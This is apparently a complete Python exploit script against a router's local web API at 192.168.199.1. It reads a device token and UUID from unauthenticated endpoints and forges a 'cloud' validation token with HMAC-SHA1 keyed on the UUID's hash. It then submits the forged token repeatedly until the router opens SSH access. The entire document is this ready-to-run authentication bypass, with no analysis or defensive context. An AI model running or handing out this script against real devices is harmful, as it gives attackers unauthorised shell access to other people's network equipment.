import base64, hashlib, hmac, json, subprocess, time

BASE = "http://192.168.199.1"

def curl(url):
    return subprocess.run(["curl", "-s", "-m", "15", url], capture_output=True, text=True).stdout

def get_local_token():
    return json.loads(curl(BASE + "/local-ssh/api?method=get"))["data"]

def get_uuid():
    return json.loads(curl(BASE + "/cgi-bin/turbo/proxy/router_info"))["data"]["uuid"]

def compute_cloud_token(local_token, uuid):
    decoded = base64.b64decode(local_token)
    parts = decoded.split(b",")
    timestamp = int(parts[2]) + 1
    parts[2] = str(timestamp).encode()
    msg = b",".join(parts[:3])
    key = hashlib.sha1(uuid.encode()).digest()
    mac = hmac.new(key, msg, hashlib.sha1).digest()
    return base64.b64encode(mac).decode()

uuid = get_uuid()
for attempt in range(12):
    local_token = get_local_token()
    cloud_token = compute_cloud_token(local_token, uuid)
    url = BASE + "/local-ssh/api?method=valid&data=" + cloud_token.replace("+", "%2B")
    resp = curl(url)
    print(f"[{attempt}] cloud={cloud_token} -> {resp}")
    if "Success" in resp or "port is" in resp:
        break
    time.sleep(2)